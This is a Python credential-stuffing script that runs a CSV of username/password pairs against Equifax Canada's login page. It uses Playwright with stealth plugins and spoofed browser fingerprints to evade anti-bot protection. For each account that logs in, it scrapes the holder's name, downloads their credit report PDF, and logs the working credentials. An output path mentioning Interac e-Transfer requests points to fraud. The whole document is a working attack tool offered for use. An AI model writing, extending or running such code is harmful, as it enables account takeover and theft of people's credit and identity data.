import csv
import json
import re
import os
import time
import asyncio
from playwright.async_api import async_playwright
from playwright_stealth import Stealth

# ============================================================
#  FICHIERS
# ============================================================
INPUT_FILE    = r"C:\Users\km\Downloads\equi.csv"
OUTPUT_DIR    = r"C:\Users\km\Downloads\INTERAC e-Transfer request for money_files\reports"
RESULTS_FILE  = "resultats.txt"
PROGRESS_FILE = "progress.txt"

# ============================================================
#  PARAMETRES
# ============================================================
BASE_URL = "https://my.equifax.ca"

def charger_csv():
    comptes = []
    with open(INPUT_FILE, newline="", encoding="utf-8") as f:
        reader = csv.DictReader(f)
        for row in reader:
            username = row.get("USERNAME", "").strip()
            password = row.get("PASSWORD", "").strip()
            if username and password:
                password = re.sub(r'\s*\|\s*$', '', password)
                comptes.append((username, password))
    return comptes

def charger_progression():
    done = set()
    if os.path.exists(PROGRESS_FILE):
        with open(PROGRESS_FILE, "r", encoding="utf-8") as f:
            for line in f:
                if line.strip():
                    done.add(line.strip())
    return done

def sauver_progression(email):
    with open(PROGRESS_FILE, "a", encoding="utf-8") as f:
        f.write(email + "\n")

def extraire_nom_html(html):
    fn = re.search(r'"firstName"\s*:\s*"([^"]+)"', html)
    ln = re.search(r'"lastName"\s*:\s*"([^"]+)"', html)
    if fn and ln:
        return f"{fn.group(1)} {ln.group(1)}"
    nm = re.search(r'<(?:h[1-3]|span|div)[^>]*class="[^"]*name[^"]*"[^>]*>([^<]+)<', html, re.IGNORECASE)
    if nm:
        return nm.group(1).strip()
    return None

async def traiter_compte_playwright(p, username, password):
    # Lancer le navigateur en mode VISIBLE pour contourner les protections anti-bot (Cloudflare/Imperva)
    browser = await p.chromium.launch(
        headless=False,
        args=["--disable-blink-features=AutomationControlled"]
    )
    # Creer un contexte qui simule un vrai navigateur
    context = await browser.new_context(
        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        viewport={"width": 1280, "height": 720},
        locale="en-CA",
        timezone_id="America/Toronto"
    )
    
    page = await context.new_page()
    stealth = Stealth()
    await stealth.apply_stealth_async(page)
    
    status = "ERREUR"
    nom = ""
    pdf_saved = False
    detail = ""

    try:
        # Aller sur la page de login
        await page.goto(f"{BASE_URL}/login", timeout=30000, wait_until="domcontentloaded")
        
        # Attendre les champs
        try:
            await page.wait_for_selector('input[name="username"], input[type="email"], input[id*="user"]', timeout=15000)
        except Exception as e:
            # Capturer ce qui bloque
            await page.screenshot(path="screenshot_error.png", full_page=True)
            raise Exception("Timeout attente champ username - Capture d'ecran faite.")

        # Taper username et password lentement
        await page.fill('input[name="username"], input[type="email"], input[id*="user"]', username)
        await asyncio.sleep(1)
        
        await page.fill('input[name="password"], input[type="password"]', password)
        await asyncio.sleep(1)
        
        # Cliquer sur login
        bouton_login = await page.query_selector('button[type="submit"], button:has-text("Sign In"), button:has-text("Log In")')
        if bouton_login:
            await bouton_login.click()
        else:
            await page.keyboard.press("Enter")

        # Attendre le resultat
        try:
            await page.wait_for_function('''() => {
                return window.location.href.indexOf('login') === -1 || 
                       document.querySelector('.error-message, [role="alert"], .alert-danger') !== null;
            }''', timeout=20000)
        except Exception:
            pass
            
        await asyncio.sleep(2) 

        url = page.url
        content = await page.content()

        if "login" in url:
            if "invalid" in content.lower() or "incorrect" in content.lower() or "not found" in content.lower():
                status = "LOGIN_INVALIDE"
                detail = "Identifiants invalides"
            elif "locked" in content.lower() or "blocked" in content.lower():
                status = "COMPTE_BLOQUE"
                detail = "Compte verrouille"
            else:
                status = "ERREUR_LOGIN"
                detail = "Resté sur page de login"
        else:
            status = "LOGIN_OK"
            nom = extraire_nom_html(content)
            
            if not nom:
                await page.goto(f"{BASE_URL}/credit-report/personal-info", wait_until="domcontentloaded")
                await asyncio.sleep(2)
                content = await page.content()
                nom = extraire_nom_html(content)
            
            if nom:
                status = "OK"
                
            cookies = await context.cookies()
            s = __import__("requests").Session()
            for c in cookies:
                s.cookies.set(c['name'], c['value'], domain=c['domain'])
                
            s.headers.update({
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Accept": "application/pdf",
                "Referer": f"{BASE_URL}/credit-report/personal-info"
            })
            
            try:
                r_pdf = s.get(f"{BASE_URL}/membercenter/app/data/product/one_b_adhoc_report/v1/credit-report-pdf", timeout=20)
                if r_pdf.status_code == 200 and r_pdf.content[:5] == b"%PDF-":
                    os.makedirs(OUTPUT_DIR, exist_ok=True)
                    safe = re.sub(r'[^\w@.\-]', '_', username)
                    path = os.path.join(OUTPUT_DIR, f"{safe}.pdf")
                    with open(path, "wb") as f:
                        f.write(r_pdf.content)
                    pdf_saved = True
            except:
                pass
                
    except Exception as e:
        status = "ERREUR"
        detail = str(e).replace('\n', ' -- ')[:200]
    finally:
        await browser.close()
        
    return status, nom or "", pdf_saved, detail


async def run_batch():
    comptes = charger_csv()
    if not comptes:
        print("Aucun compte dans le CSV.")
        return

    deja = charger_progression()
    a_faire = [(u, p) for u, p in comptes if u not in deja]
    skip = len(comptes) - len(a_faire)

    print(f"Playwright: {len(a_faire)}/{len(comptes)} comptes a traiter (skip {skip})")
    
    if not os.path.exists(RESULTS_FILE) or skip == 0:
        with open(RESULTS_FILE, "w", encoding="utf-8") as f:
            f.write("Email\tPassword\tStatus\tNom\tPDF\n")

    async with async_playwright() as p:
        for i, (username, password) in enumerate(a_faire, start=skip + 1):
            t0 = time.time()
            
            status, nom, pdf, detail = await traiter_compte_playwright(p, username, password)
            
            dt = time.time() - t0
            
            pdf_txt = "PDF:oui" if pdf else ""
            if status == "OK":
                print(f"[{i}/{len(comptes)}] {username} -> {nom} {pdf_txt} ({dt:.1f}s)")
            elif status == "LOGIN_INVALIDE":
                print(f"[{i}/{len(comptes)}] {username} -> INVALIDE ({dt:.1f}s)")
            else:
                print(f"[{i}/{len(comptes)}] {username} -> {status}: {detail} {pdf_txt} ({dt:.1f}s)")

            with open(RESULTS_FILE, "a", encoding="utf-8") as f:
                f.write(f"{username}\t{password}\t{status}\t{nom}\t{'oui' if pdf else 'non'}\n")

            sauver_progression(username)

def main():
    print("============================================================")
    print("  NWIMRA - Equifax (PLAYWRIGHT STEALTH VERSION)")
    print("============================================================")
    try:
        asyncio.run(run_batch())
    except KeyboardInterrupt:
        print("\nArrete par l'utilisateur.")

if __name__ == "__main__":
    main()
